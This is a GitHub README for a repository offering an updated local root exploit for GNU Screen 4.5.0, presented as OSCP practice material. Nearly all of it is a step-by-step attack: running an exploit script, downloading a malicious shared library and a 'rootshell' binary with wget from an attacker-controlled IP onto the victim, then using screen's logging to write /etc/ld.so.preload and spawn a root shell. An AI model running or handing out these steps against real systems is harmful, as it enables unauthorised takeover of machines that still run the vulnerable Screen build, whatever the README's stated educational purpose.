# screen v4.5.0 Privilege Escalation
`Updated GNU Screen 4.5.0 Exploit:` This repository hosts an enhanced exploit for `GNU Screen 4.5.0` that is related to OSCP Machine. It includes modifications for compatibility with the latest binary configurations in Kali Linux. Intended for educational and research purposes to demonstrate privilege escalation.
- The orginal lib <a href="https://github.com/XiphosResearch/exploits/blob/master/screen2root/README.md"> github-lib</a> and <a href="https://www.exploit-db.com/exploits/41154"> exploit-db</a> 
- The orginal Report <a href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html">Bug Report</a>

<p align="center"><img src="https://github.com/YasserREED/screen-v4.5.0-priv-escalate/blob/main/img/Front-img.png"></p>

![](https://img.shields.io/badge/Version-%20v1.0.0-blue)
![](https://img.shields.io/badge/Twitter-%20YasserREED-blue)
![](https://img.shields.io/badge/YouTube-%20YasserRED-red)



## Step - Step exploit

#### Setup
```bash
sudo git clone https://github.com/YasserREED/screen-v4.5.0-priv-escalate.git
cd screen-v4.5.0-priv-escalate
sudo chmod +x exploit.sh
./exploit.sh
```

#### Transfer the Files
```console
victom@Machine$ cd /tmp
victom@Machine$ wget 192.168.45.x/libhax.so
victom@Machine$ wget 192.168.45.x/rootshell
```
#### Give the permissions
```console
victom@Machine$ chmod +x libhax.so
victom@Machine$ chmod +x rootshell
```
#### Smash to root
```bash
cd /etc || exit 1
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```

<br>

---

<p align="center"> Hack The Planet! :heart_on_fire: </p>
